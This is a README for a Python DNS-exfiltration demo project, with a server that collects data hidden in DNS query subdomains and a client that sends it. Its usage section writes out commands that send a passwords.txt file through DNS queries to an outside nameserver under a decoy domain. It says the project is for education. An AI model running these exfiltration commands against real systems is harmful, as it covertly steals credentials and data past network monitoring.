## DNS-Exfiltration

### Overview

This project contains two scripts: `server.py` and `client.py`. These scripts are used to demonstrate DNS exfiltration, where data is covertly sent from a client to a server using DNS queries.

### server.py

The `server.py` script sets up a DNS server that listens for DNS queries. It extracts data from the subdomain of incoming DNS queries, decodes it, and saves it to a specified file.

### client.py

The `client.py` script is used to send data to the DNS server by encoding the data in the subdomain of DNS queries. 

### Prerequisites

- Python 3.x
- dnslib
- colorama

You can install the required Python packages using pip:

### Usage

#### Running the DNS Server

1. Run the `server.py` script with the `-o` or `--output` option to specify the output file where the exfiltrated data will be saved.

```bash
python3 ./server.py -o output.txt
``` 

Pro Server Options

```bash
python3 ./server.py -o output.txt -p 53
```

The server will start listening on port `53` for incoming DNS queries.

#### Running the DNS Client

1. Use the `client.py` script to send data to the DNS server. This script will encode the data and send it in the subdomain of DNS queries to the server.

Here's an example of how to run the client script:

```bash
python3 ./client.py -d "google.com" -f "passwords.txt"
```

Pro Client Options

```bash
python3 client.py -d legitimate-domain.com -f passwords.txt -p 53 --nameserver 10.10.166.126
```

In this example, `legitimate-domain.com` is the domain to which the DNS queries will be sent, and `passwords` is the file containing the data to be exfiltrated.

![](https://i.imgur.com/f2D0Z7p.png)

### Note

This project is for educational purposes only. Unauthorized data exfiltration is illegal and unethical. Always obtain proper authorization before testing any security mechanism.